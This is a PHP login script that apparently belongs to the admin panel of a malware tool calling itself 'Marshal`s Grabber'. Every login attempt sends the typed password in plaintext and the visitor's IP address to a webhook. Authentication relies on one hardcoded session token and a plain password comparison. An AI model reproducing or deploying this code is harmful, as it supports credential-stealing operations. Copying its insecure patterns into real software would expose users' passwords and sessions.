<?php
    require_once('../Inc/fonctions.php');
    global $login_password, $logs_webhook;

    if(isset($_POST['password']) && !empty($_POST['password'])) {
        if($_POST['password'] == $login_password) {
            
            $_SESSION['token'] = "n4wh0bhflr5z0v5s5l5q5lk1u1u3jm6eg3162atmey"; // Just for check if you are logged
            SendToWebhook($logs_webhook, json_encode(["username" => "Marshal`s Grabber","avatar_url" => "https://i.imgur.com/9NNLgx1.jpg","embeds" => [["description" => "> __Attempt to connect to Marshal`s Lab Succeeded:__\n```Password: " . $_POST['password'] . "```\nIp Adress: `".$_SERVER['REMOTE_ADDR']."`","footer" => ["text" => "Marshal`s Grabber - https://github.com/cepheidev","icon_url" => "https://i.imgur.com/j79yzMM.gif"]]]]));
            header('Location: ../'); die();

        } else {
            
            SendToWebhook($logs_webhook, json_encode(["username" => "Marshal`s Grabber","avatar_url" => "https://i.imgur.com/9NNLgx1.jpg","embeds" => [["description" => "> __Attempt to connect to Marshal`s Lab Failed:__\n```Password: " . $_POST['password'] . "```\nIp Adress: `".$_SERVER['REMOTE_ADDR']."`","footer" => ["text" => "Marshal`s Grabber - https://github.com/cepheidev","icon_url" => "https://i.imgur.com/j79yzMM.gif"]]]]));
            header('Location: ../login.php?error=invalid'); die();
        }
        
    } else {
        SendToWebhook($logs_webhook, json_encode(["username" => "Marshal`s Grabber","avatar_url" => "https://i.imgur.com/9NNLgx1.jpg","embeds" => [["description" => "> __Attempt to connect to Marshal`s Failed:__\n```Password: " . $_POST['password'] . "```\nIp Adress: `".$_SERVER['REMOTE_ADDR']."`","footer" => ["text" => "Marshal`s Grabber - https://github.com/cepheidev","icon_url" => "https://i.imgur.com/j79yzMM.gif"]]]]));
        header('Location: ../login.php?error=invalid'); die();
    }

?>
